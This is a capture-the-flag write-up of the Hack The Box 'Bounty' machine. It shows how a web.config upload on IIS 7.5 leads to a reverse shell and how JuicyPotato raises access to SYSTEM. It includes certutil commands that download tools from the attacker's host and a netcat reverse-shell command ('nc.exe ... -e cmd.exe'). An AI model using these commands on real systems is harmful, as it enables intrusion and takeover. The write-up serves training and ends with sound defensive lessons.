# HTB Write-Up: Bounty

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Bounty)     |
| Difficulty | Easy                                                           |
| OS         | Windows                                                        |
| Author     | Landau                                                        |
| Date       | April 17, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — IIS Web Application & Upload Endpoint Discovery](#2-enumeration--iis-web-application--upload-endpoint-discovery)
3. [Initial Access — web.config Upload to RCE on IIS](#3-initial-access--webconfig-upload-to-rce-on-iis)
4. [Privilege Escalation — SeImpersonatePrivilege via JuicyPotato](#4-privilege-escalation--seimpersonateprivilege-via-juicypotato)
5. [Summary](#5-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** followed by an aggressive **Nmap** scan for service fingerprinting:

```bash
rustscan -a 10.129.22.1 --ulimit 5000
nmap -A 10.129.22.1
```

**Open Ports:**

| Port | Service | Details                                              |
|------|---------|------------------------------------------------------|
| 80   | HTTP    | Microsoft IIS httpd 7.5 — Windows Server 2008 R2     |

Only a single port is exposed. The web server banner identifies **Microsoft IIS 7.5**, which is associated with **Windows Server 2008 R2 / Windows 7**. Nmap also reports that the `TRACE` HTTP method is enabled — a minor misconfiguration, but the primary attack surface is the web application itself.

---

## 2. Enumeration — IIS Web Application & Upload Endpoint Discovery

### 2.1 — Directory Enumeration

Content discovery was performed with **Gobuster** against the IIS root:

```bash
gobuster dir -u http://10.129.22.1 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
```

**Findings:**

| Path            | Status | Notes                                    |
|-----------------|--------|------------------------------------------|
| /aspnet_client  | 301    | Standard ASP.NET directory               |
| /uploadedfiles  | 301    | Non-default — uploaded file storage      |

The presence of an `/uploadedfiles` directory strongly implies a file upload endpoint exists elsewhere on the application.

### 2.2 — Targeted Upload Endpoint Discovery

A focused custom wordlist was constructed by extracting upload and transfer-related entries from the SecLists `big.txt` wordlist, then fuzzing with common IIS-relevant extensions:

```bash
grep upload /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt > wordlist.txt
grep transfer /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt >> wordlist.txt

gobuster dir -u http://10.129.22.1 -w wordlist.txt -x .php,.aspx,.html
```

**Result:**

```
/uploadedfiles    [Status: 301]
/transfer.aspx    [Status: 200]
```

`/transfer.aspx` was confirmed as the file upload endpoint.

---

## 3. Initial Access — web.config Upload to RCE on IIS

### 3.1 — Upload Restriction Bypass via web.config

Direct upload of executable files (`.aspx`, `.php`) was blocked by the application's extension filtering. However, IIS has a well-known weakness: if a `web.config` file can be uploaded to a web-accessible directory, IIS will parse and execute it — including any embedded ASP.NET or server-side directives it contains.

A malicious `web.config` was crafted to execute a PowerShell download cradle on the server. When IIS processes the uploaded configuration file, it fetches and executes a PowerShell reverse shell payload (`Invoke-PowerShellTcp.ps1`) hosted on the attacker's HTTP server.

### 3.2 — Setting Up the Attack Infrastructure

Before uploading, a Python HTTP server was started to serve the PowerShell payload, and a netcat listener was opened to catch the reverse shell:

```bash
# Attacker terminal 1 — serve the PowerShell reverse shell script
python3 -m http.server 80

# Attacker terminal 2 — catch the incoming shell
rlwrap nc -lnvp 9001
```

The `web.config` was then uploaded via `transfer.aspx`. IIS processed the file, triggered the download cradle, and executed the reverse shell.

### 3.3 — Shell Obtained

**Result — PowerShell shell obtained as `BOUNTY$` (the IIS application pool identity):**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.22.1] 49159
Windows PowerShell running as user BOUNTY$ on BOUNTY
PS C:\windows\system32\inetsrv>
```

---

## 4. Privilege Escalation — SeImpersonatePrivilege via JuicyPotato

### 4.1 — Privilege Enumeration

The current token's privileges were inspected:

```powershell
whoami /priv
```

**Output:**

```
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**`SeImpersonatePrivilege` is enabled.** This privilege, commonly held by IIS application pool identities and SQL Server service accounts, allows the current process to impersonate any authentication token — including `NT AUTHORITY\SYSTEM`. On unpatched older Windows versions (Server 2008 R2 in this case), this is exploitable via **JuicyPotato**.

### 4.2 — Transferring Exploit Binaries

`JuicyPotato.exe` and `nc64.exe` were transferred to the target using `certutil`, a built-in Windows utility commonly used as a download proxy:

```powershell
certutil -urlcache -split -f http://10.10.15.33/JuicyPotato.exe C:\Temp\JuicyPotato.exe
certutil -urlcache -split -f http://10.10.15.33/nc64.exe C:\Temp\nc.exe
```

### 4.3 — Executing JuicyPotato

JuicyPotato abuses the Windows COM server activation mechanism. By registering a COM object under a privileged CLSID and triggering a token impersonation via DCOM, it forces the system to authenticate as `SYSTEM` — and then executes an arbitrary command under that context.

```powershell
C:\Temp\JuicyPotato.exe -l 1337 -p cmd.exe `
  -a "/c C:\Temp\nc.exe 10.10.15.33 1337 -e cmd.exe" `
  -t * `
  -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

**Result — SYSTEM shell obtained:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.22.1] 49197
C:\Windows\system32> whoami
nt authority\system
```

**Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.**

---

## 5. Summary

| Phase                  | Technique                                                         | Result                          |
|------------------------|-------------------------------------------------------------------|---------------------------------|
| Recon                  | RustScan + Nmap -A                                                | Single port: IIS 7.5 on port 80 |
| Enumeration            | Gobuster directory scan                                           | `/uploadedfiles` + `/transfer.aspx` discovered |
| Upload Bypass          | `web.config` upload — IIS executes server-side directives         | PowerShell download cradle executed |
| Initial Access         | `Invoke-PowerShellTcp.ps1` reverse shell via `web.config`        | Shell as `BOUNTY$`              |
| Privilege Enumeration  | `whoami /priv`                                                    | `SeImpersonatePrivilege` enabled |
| Privilege Escalation   | JuicyPotato — DCOM token impersonation via CLSID                 | Shell as `NT AUTHORITY\SYSTEM`  |

### Key Takeaways

- **File upload endpoints must validate file content, not just file extensions.** The application blocked `.aspx` uploads by extension but permitted `web.config`, which IIS treats as a first-class executable configuration file. Robust upload filtering requires content-type inspection, execution prevention in upload directories, and denylisting of IIS-sensitive filenames specifically.
- **IIS upload directories should be configured as non-executable.** Placing uploaded files in a directory where IIS is configured to serve — but not execute — static content eliminates the `web.config` upload vector entirely. The `uploadedfiles` directory should have script execution disabled at the IIS handler level.
- **`SeImpersonatePrivilege` on a web-facing service account is a critical misconfiguration.** IIS application pool identities are granted this privilege by default, but on legacy Windows versions (pre-Server 2019 with hotfixes), this directly enables SYSTEM-level compromise via JuicyPotato or similar potato exploits. Keeping Windows fully patched and isolating service accounts mitigates this path.
- **Legacy IIS versions present a significantly wider attack surface.** IIS 7.5 on Server 2008 R2 is end-of-life and no longer receives security updates. Any internet-exposed application running on end-of-life infrastructure should be treated as critically vulnerable regardless of its application-level defences.
